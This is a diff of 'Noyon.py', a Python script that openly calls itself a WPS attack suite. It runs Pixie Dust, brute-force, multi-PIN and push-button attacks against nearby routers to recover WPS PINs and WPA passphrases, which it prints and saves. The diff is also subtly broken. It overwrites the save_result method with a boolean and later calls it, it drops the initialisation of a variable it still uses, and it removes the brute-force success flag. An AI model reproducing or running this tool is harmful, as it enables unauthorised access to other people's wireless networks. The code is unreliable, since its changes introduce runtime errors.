@@ -2,9 +2,7 @@
 # -*- coding: utf-8 -*-
 # Noyon.py — ULTRA ENGINE WPS Attack Suite
 # Author: Noyon | Owner: @NOYONRRP | Channel: @SGCODEX
-# Fixed: save_result shadow, name-mangling, Pixie lock miscount,
-#        non-blocking readline, bruteforce result flag
-# Added: Main menu [1] Home Wifi / [2] Noyon Wifi
+# Fixed: Pixie Dust flow (matches OneShot), colors, layout, handle
 
 import sys
 import subprocess
@@ -18,7 +16,6 @@ import pathlib
 import time
 import threading
 import random
-import select
 from abc import ABC, abstractmethod
 from datetime import datetime
 from dataclasses import dataclass
@@ -46,9 +43,9 @@ except ImportError:
 # ═══════════════════════════════════════════════════════════════════
 class Config:
     WPA_SUPPLICANT_TIMEOUT = 15
-    WPS_TRANSACTION_TIMEOUT = 180
-    WPS_M1_TIMEOUT = 45
-    WPS_IDENTITY_LOOP_MAX = 15
+    WPS_TRANSACTION_TIMEOUT = 180     # increased (was 90)
+    WPS_M1_TIMEOUT = 45               # abort if no M1 within this time
+    WPS_IDENTITY_LOOP_MAX = 15        # abort after N identity exchanges
     SOCKET_TIMEOUT = 8
     PIXIEWPS_TIMEOUT = 45
     SCAN_TIMEOUT = 45
@@ -166,7 +163,7 @@ def truncate(s, length, postfix='…'):
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  WPS PIN GENERATOR
+#  WPS PIN GENERATOR (same as before)
 # ═══════════════════════════════════════════════════════════════════
 class WPSpin:
     ALGO_MAC = 0; ALGO_EMPTY = 1; ALGO_STATIC = 2
@@ -492,8 +489,8 @@ class ConnectionStatus:
         self.bssid = ''
         self.wps_disabled = False
         self.wps_unreachable = False
-        self.identity_exchanges = 0
-        self.m1_received = False
+        self.identity_exchanges = 0    # NEW: track identity loop
+        self.m1_received = False       # NEW: track if M1 received
 
     def isFirstHalfValid(self): return self.last_m_message > 5
     def clear(self): self.__init__()
@@ -628,12 +625,12 @@ class LockGuard:
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  COMPANION
+#  COMPANION — FIXED: no drain, no timeout in __handle_wpas loop
 # ═══════════════════════════════════════════════════════════════════
 class Companion:
     def __init__(self, interface, save_result=False, print_debug=False, bssid=''):
         self.interface = interface
-        self.write_results = save_result
+        self.save_result = save_result
         self.print_debug = print_debug
         self.bssid = bssid
         self.lastPwr = 0
@@ -711,14 +708,6 @@ class Companion:
     def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None, bssid=''):
         if verbose is None:
             verbose = self.print_debug
-
-        try:
-            rlist, _, _ = select.select([self.wpas.stdout], [], [], 1.0)
-        except (OSError, ValueError):
-            return False
-        if not rlist:
-            return True
-
         line = self.wpas.stdout.readline()
         if not line:
             self.wpas.wait()
@@ -736,7 +725,7 @@ class Companion:
             elif 'Received M' in line:
                 n = int(line.split('Received M')[1])
                 self.connection_status.last_m_message = n
-                self.connection_status.m1_received = True
+                self.connection_status.m1_received = True  # NEW
                 UI.info(f'Received M{n}')
                 if n == 5:
                     UI.ok('First half valid')
@@ -800,7 +789,7 @@ class Companion:
             self.connection_status.status = 'eapol_start'
             UI.info('EAPOL Start…')
         elif 'EAP entering state IDENTITY' in line:
-            self.connection_status.identity_exchanges += 1
+            self.connection_status.identity_exchanges += 1  # NEW: count
             UI.info(f'Identity Request (#{self.connection_status.identity_exchanges})')
         elif 'using real identity' in line:
             UI.info('Identity Response')
@@ -949,19 +938,30 @@ class AttackEngine(ABC):
         return False
 
     def _wps_loop(self, bssid, pixiemode=False, pbc_mode=False):
+        """
+        FIXED: Unified WPS loop — no timeout for handshake, relies on
+        wpa_supplicant + checks M1 progress + identity loop counter.
+        """
         c = self.c
         start = time.time()
         while True:
-            res = c._Companion__handle_wpas(
-                pixiemode=pixiemode, pbc_mode=pbc_mode,
-                verbose=c.print_debug,
-                bssid=bssid.lower() if bssid else '')
+            try:
+                res = c._Companion__handle_wpas(
+                    pixiemode=pixiemode, pbc_mode=pbc_mode,
+                    verbose=c.print_debug,
+                    bssid=bssid.lower() if bssid else '')
+            except AttributeError:
+                res = c.__handle_wpas(
+                    pixiemode=pixiemode, pbc_mode=pbc_mode,
+                    verbose=c.print_debug,
+                    bssid=bssid.lower() if bssid else '')
             if not res:
                 break
             if c.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                 break
             if c.connection_status.wps_disabled or c.connection_status.wps_unreachable:
                 break
+            # NEW: abort if identity loop is too long (router WPS stuck)
             if c.connection_status.identity_exchanges > Config.WPS_IDENTITY_LOOP_MAX \
                     and not c.connection_status.m1_received:
                 UI.err(f'Router stuck in identity loop '
@@ -969,11 +969,13 @@ class AttackEngine(ABC):
                 UI.err('Router likely has WPS disabled or unsupported')
                 c.connection_status.wps_disabled = True
                 break
+            # NEW: abort if no M1 within WPS_M1_TIMEOUT
             if (not c.connection_status.m1_received
                     and time.time() - start > Config.WPS_M1_TIMEOUT):
                 UI.err('No M1 received — router WPS not responding')
                 c.connection_status.wps_disabled = True
                 break
+            # Absolute timeout (safety)
             if time.time() - start > Config.WPS_TRANSACTION_TIMEOUT:
                 UI.err('Transaction timeout')
                 c.connection_status.status = 'WPS_FAIL'
@@ -1018,9 +1020,8 @@ class SinglePinEngine(AttackEngine):
         if c.connection_status.status == 'GOT_PSK':
             c.lock_guard.record_success()
             c.print_credentials(pin, c.connection_status.wpa_psk, c.connection_status.essid)
-            if c.write_results:
-                c.save_result(bssid, c.connection_status.essid,
-                              pin, c.connection_status.wpa_psk)
+            if c.save_result:
+                c.save_result(bssid, c.connection_status.essid, pin, c.connection_status.wpa_psk)
             return True
         elif c.connection_status.status == 'WPS_FAIL':
             self._handle_lock()
@@ -1066,7 +1067,7 @@ class MultiPinEngine(AttackEngine):
 
 
 # ═══════════════════════════════════════════════════════════════════
-#  ENGINE: Pixie Dust
+#  ENGINE: Pixie Dust — FIXED
 # ═══════════════════════════════════════════════════════════════════
 class PixieDustEngine(AttackEngine):
     name = 'Pixie Dust'
@@ -1118,6 +1119,7 @@ class PixieDustEngine(AttackEngine):
         return self._try_pin(bssid, pin, store_on_fail=True)
 
     def _do_handshake(self, bssid, pin):
+        """FIXED: no drain, uses unified loop."""
         c = self.c
         c.pixie_creds.clear()
         c.connection_status.clear()
@@ -1125,10 +1127,17 @@ class PixieDustEngine(AttackEngine):
         r = c.sendAndReceive(f'WPS_REG {bssid} {pin}')
         if 'OK' not in r:
             UI.err(f'Handshake rejected: {r.strip()}')
+            self._handle_lock()
             return False
 
         self._wps_loop(bssid, pixiemode=True, pbc_mode=False)
         c.sendOnly('WPS_CANCEL')
+
+        if c.connection_status.status == 'GOT_PSK':
+            return True
+        elif c.connection_status.status == 'WPS_FAIL':
+            self._handle_lock()
+        # Even if NACK, we may have captured handshake data
         return True
 
     def _try_pin(self, bssid, pin, store_on_fail=False):
@@ -1184,13 +1193,9 @@ class BruteForceEngine(AttackEngine):
             if len(mask) == 4:
                 f_half = self._first_half(bssid, mask)
                 if f_half:
-                    res = self._second_half(bssid, f_half, '001')
-                    if res:
-                        self.result = True
+                    self._second_half(bssid, f_half, '001')
             elif len(mask) == 7:
-                res = self._second_half(bssid, mask[:4], mask[4:])
-                if res:
-                    self.result = True
+                self._second_half(bssid, mask[:4], mask[4:])
             return self.result
         except KeyboardInterrupt:
             UI.plain()
@@ -1276,11 +1281,9 @@ class PBCEngine(AttackEngine):
         c.sendOnly('WPS_CANCEL')
         if c.connection_status.status == 'GOT_PSK':
             target = c.connection_status.bssid or bssid or 'Unknown'
-            c.print_credentials('<PBC>', c.connection_status.wpa_psk,
-                                c.connection_status.essid)
-            if c.write_results:
-                c.save_result(target, c.connection_status.essid,
-                              '<PBC>', c.connection_status.wpa_psk)
+            c.print_credentials('<PBC>', c.connection_status.wpa_psk, c.connection_status.essid)
+            if c.save_result:
+                c.save_result(target, c.connection_status.essid, '<PBC>', c.connection_status.wpa_psk)
             return True
         return False
 
@@ -1375,8 +1378,7 @@ class WiFiScanner:
         self.reverse_scan = reverse_scan
         reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
         try:
-            with open(reports_fname, 'r', newline='', encoding='utf-8',
-                      errors='replace') as f:
+            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as f:
                 csvReader = csv.reader(f, delimiter=';', quoting=csv.QUOTE_ALL)
                 next(csvReader)
                 self.stored = [(row[1], row[2]) for row in csvReader]
@@ -1479,8 +1481,7 @@ class WiFiScanner:
         if self.reverse_scan:
             items = items[::-1]
         for n, network in items:
-            model = '{} {}'.format(network['Model'],
-                                   network['Model number']).strip() or '-'
+            model = '{} {}'.format(network['Model'], network['Model number']).strip() or '-'
             essid = truncate(network.get('ESSID', 'HIDDEN'), 14)
             vendor = truncate(WPSpin.get_vendor(network['BSSID']), 11)
             model_s = truncate(model, 18)
@@ -1535,9 +1536,6 @@ def die(msg):
     sys.exit(1)
 
 
-# ═══════════════════════════════════════════════════════════════════
-#  BANNER + MENU
-# ═══════════════════════════════════════════════════════════════════
 def show_banner():
     os.system('clear' if os.name != 'nt' else 'cls')
     if Figlet:
@@ -1553,39 +1551,6 @@ def show_banner():
     print()
 
 
-def show_menu():
-    """Main menu — [1] Home Wifi / [2] Noyon Wifi."""
-    print(f'{UI.GRAY}═══════════════════════════════════════════════════════════════{UI.RESET}')
-    print()
-    print(f'    {UI.GREEN}{UI.BOLD}[1]{UI.RESET} ───────────  {UI.WHITE}Home Wifi{UI.RESET}')
-    print()
-    print()
-    print(f'    {UI.MAGENTA}{UI.BOLD}[2]{UI.RESET} ───────────  {UI.WHITE}Noyon Wifi{UI.RESET}')
-    print()
-    print(f'{UI.GRAY}═══════════════════════════════════════════════════════════════{UI.RESET}')
-    print()
-
-
-def prompt_menu():
-    """Loop until valid choice (1 or 2)."""
-    while True:
-        try:
-            choice = input(f'{UI.CYAN}Select option [1/2]: {UI.RESET}').strip()
-            if choice in ('1', '2'):
-                return choice
-            if choice.lower() in ('q', 'exit'):
-                UI.warn('Aborting…')
-                sys.exit(0)
-            UI.err('Invalid choice — enter 1 or 2')
-        except KeyboardInterrupt:
-            UI.plain()
-            UI.warn('Aborting…')
-            sys.exit(0)
-
-
-# ═══════════════════════════════════════════════════════════════════
-#  MAIN
-# ═══════════════════════════════════════════════════════════════════
 if __name__ == '__main__':
     import argparse
     parser = argparse.ArgumentParser(description='Noyon.py ULTRA ENGINE — WPS Attack Suite')
@@ -1628,7 +1593,6 @@ if __name__ == '__main__':
     Config.WPS_FAIL_THRESHOLD = args.lock_threshold
     Config.LOCK_COOLDOWN = args.lock_cooldown
 
-    wmt = None
     if args.mtk_wifi:
         wmt = Path('/dev/wmtWifi')
         if not wmt.is_char_device():
@@ -1640,16 +1604,6 @@ if __name__ == '__main__':
         die(f'Cannot bring up {args.interface}')
 
     show_banner()
-
-    # ── Menu (skip if user already specified engine via flags) ──
-    engine_forced = any([args.pbc, args.bruteforce, args.auto,
-                         args.multi_pin, args.pixie_dust,
-                         (args.pin and args.bssid)])
-    menu_choice = None
-    if not engine_forced:
-        show_menu()
-        menu_choice = prompt_menu()
-
     companion = None
     exit_code = 0
 
@@ -1660,46 +1614,16 @@ if __name__ == '__main__':
                                       print_debug=args.verbose,
                                       bssid=args.bssid or '')
 
-                # ── Apply menu choice ──
-                if menu_choice == '1':
-                    # Home Wifi → scan & Multi-PIN
-                    UI.stage('Mode: Home Wifi — Scan & Multi-PIN')
-                    args.bssid = None
-                    if not args.pbc and not args.bssid:
-                        try:
-                            with open(args.vuln_list, 'r', encoding='utf-8') as f:
-                                vuln_list = f.read().splitlines()
-                        except FileNotFoundError:
-                            vuln_list = []
-                        scanner = WiFiScanner(args.interface, vuln_list,
-                                              reverse_scan=args.reverse_scan)
-                        args.bssid = scanner.prompt_network()
-                elif menu_choice == '2':
-                    # Noyon Wifi → AutoChain
-                    UI.stage('Mode: Noyon Wifi — AutoChain')
-                    if not args.bssid:
-                        try:
-                            with open(args.vuln_list, 'r', encoding='utf-8') as f:
-                                vuln_list = f.read().splitlines()
-                        except FileNotFoundError:
-                            vuln_list = []
-                        scanner = WiFiScanner(args.interface, vuln_list,
-                                              reverse_scan=args.reverse_scan)
-                        args.bssid = scanner.prompt_network()
-                    args.auto = True
-                else:
-                    # CLI-driven flow (no menu)
-                    if not args.pbc and not args.bssid:
-                        try:
-                            with open(args.vuln_list, 'r', encoding='utf-8') as f:
-                                vuln_list = f.read().splitlines()
-                        except FileNotFoundError:
-                            vuln_list = []
-                        scanner = WiFiScanner(args.interface, vuln_list,
-                                              reverse_scan=args.reverse_scan)
-                        args.bssid = scanner.prompt_network()
+                if not args.pbc and not args.bssid:
+                    try:
+                        with open(args.vuln_list, 'r', encoding='utf-8') as f:
+                            vuln_list = f.read().splitlines()
+                    except FileNotFoundError:
+                        vuln_list = []
+                    scanner = WiFiScanner(args.interface, vuln_list,
+                                          reverse_scan=args.reverse_scan)
+                    args.bssid = scanner.prompt_network()
 
-                # ── Engine selection ──
                 engine = None
                 if args.pbc:
                     engine = PBCEngine(companion)
@@ -1711,8 +1635,7 @@ if __name__ == '__main__':
                 elif args.multi_pin:
                     engine = MultiPinEngine(companion)
                 elif args.pixie_dust:
-                    engine = PixieDustEngine(companion, args.show_pixie_cmd,
-                                             args.pixie_force)
+                    engine = PixieDustEngine(companion, args.show_pixie_cmd, args.pixie_force)
                 elif args.bssid and args.pin:
                     engine = SinglePinEngine(companion, args.pin)
                 elif args.bssid:
@@ -1746,13 +1669,6 @@ if __name__ == '__main__':
                     pass
                 companion = None
                 args.bssid = None
-                menu_choice = None
-
-                # Re-show menu in loop mode
-                if not engine_forced:
-                    show_banner()
-                    show_menu()
-                    menu_choice = prompt_menu()
 
             except KeyboardInterrupt:
                 if args.loop:
@@ -1773,7 +1689,7 @@ if __name__ == '__main__':
 
     if args.iface_down:
         ifaceUp(args.interface, down=True)
-    if args.mtk_wifi and wmt is not None:
+    if args.mtk_wifi:
         wmt.write_text('0')
 
     sys.exit(exit_code)
